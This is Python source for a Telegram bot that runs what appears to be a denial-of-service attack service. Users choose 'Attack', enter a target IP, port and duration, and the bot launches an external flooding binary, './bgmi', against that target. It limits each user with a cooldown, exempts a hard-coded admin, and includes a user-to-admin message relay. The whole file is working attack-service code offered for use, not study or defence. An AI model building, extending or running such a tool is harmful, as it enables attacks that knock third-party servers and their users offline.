import os, time, threading, subprocess
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ================= CONFIG =================
BOT_TOKEN = os.getenv("BOT_TOKEN")
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

MAIN_ADMIN = "5436530930"

MAX_ATTACK = 300          # 5 minutes
COOLDOWN = 1200           # 20 minutes

# ================= STATE =================
running = {}              # user_id -> process
cooldown = {}             # user_id -> last_end
awaiting_attack = set()   # user waiting for IP PORT TIME
admin_chat = set()        # user in admin chat

lock = threading.Lock()

# ================= UI =================
def main_menu(uid):
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("🚀 Attack", callback_data="attack"),
        InlineKeyboardButton("📞 Contact Admin", callback_data="contact")
    )
    if uid in running or uid == MAIN_ADMIN:
        kb.add(InlineKeyboardButton("🛑 Stop Attack", callback_data="stop"))
    return kb

def admin_chat_menu():
    kb = InlineKeyboardMarkup()
    kb.add(InlineKeyboardButton("❌ End Admin Chat", callback_data="endchat"))
    return kb

# ================= CALLBACKS =================
@bot.callback_query_handler(func=lambda c: True)
def cb(c):
    uid = str(c.message.chat.id)

    if c.data == "attack":
        awaiting_attack.add(uid)
        bot.edit_message_text(
            "Please enter:\n<code>IP PORT SECONDS</code>\n\nExample:\n<code>1.1.1.1 80 120</code>",
            uid,
            c.message.message_id,
            reply_markup=main_menu(uid)
        )

    elif c.data == "contact":
        admin_chat.add(uid)
        bot.edit_message_text(
            "💬 Admin chat enabled\nType your message",
            uid,
            c.message.message_id,
            reply_markup=admin_chat_menu()
        )

    elif c.data == "endchat":
        admin_chat.discard(uid)
        bot.edit_message_text(
            "✅ Admin chat closed",
            uid,
            c.message.message_id,
            reply_markup=main_menu(uid)
        )

    elif c.data == "stop":
        stop_attack(uid)
        bot.edit_message_text(
            "🛑 Attack stopped\n⏳ Cooldown: 20 minutes",
            uid,
            c.message.message_id,
            reply_markup=main_menu(uid)
        )

# ================= ADMIN CHAT RELAY =================
@bot.message_handler(func=lambda m: str(m.chat.id) in admin_chat and str(m.chat.id) != MAIN_ADMIN)
def user_to_admin(m):
    bot.send_message(
        MAIN_ADMIN,
        f"👤 User {m.chat.id}:\n{m.text}"
    )

@bot.message_handler(func=lambda m: str(m.chat.id) == MAIN_ADMIN and m.reply_to_message)
def admin_to_user(m):
    try:
        uid = m.reply_to_message.text.split()[2].strip(":")
        bot.send_message(uid, m.text)
    except:
        pass

# ================= ATTACK CORE =================
def stop_attack(uid):
    with lock:
        p = running.pop(uid, None)
        if p:
            try: p.terminate()
            except: pass
        cooldown[uid] = time.time()

@bot.message_handler(func=lambda m: str(m.chat.id) in awaiting_attack)
def receive_attack_params(m):
    uid = str(m.chat.id)
    awaiting_attack.discard(uid)

    # cooldown check (not for admin)
    if uid != MAIN_ADMIN:
        last = cooldown.get(uid)
        if last and time.time() - last < COOLDOWN:
            bot.send_message(
                uid,
                "You can do your next attack after 20 minutes",
                reply_markup=main_menu(uid)
            )
            return

    try:
        ip, port, sec = m.text.split()
        sec = int(sec)
        if sec > MAX_ATTACK:
            raise ValueError
    except:
        bot.send_message(uid, "Invalid format", reply_markup=main_menu(uid))
        return

    # start attack
    p = subprocess.Popen(["./bgmi", ip, port, str(sec)])
    with lock:
        running[uid] = p

    bot.send_message(
        uid,
        f"✅ Attack Started\nTarget: {ip}\nTime: {sec}s",
        reply_markup=main_menu(uid)
    )

    def wait_done():
        p.wait()
        with lock:
            running.pop(uid, None)
            cooldown[uid] = time.time()
        bot.send_message(
            uid,
            "✅ Attack completed\n⏳ Cooldown: 20 minutes",
            reply_markup=main_menu(uid)
        )

    threading.Thread(target=wait_done, daemon=True).start()

# ================= START =================
@bot.message_handler(commands=["start"])
def start(m):
    uid = str(m.chat.id)
    bot.send_message(
        uid,
        "👋 Welcome\nChoose an option",
        reply_markup=main_menu(uid)
    )

# ================= RUN =================
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
        time.sleep(3)
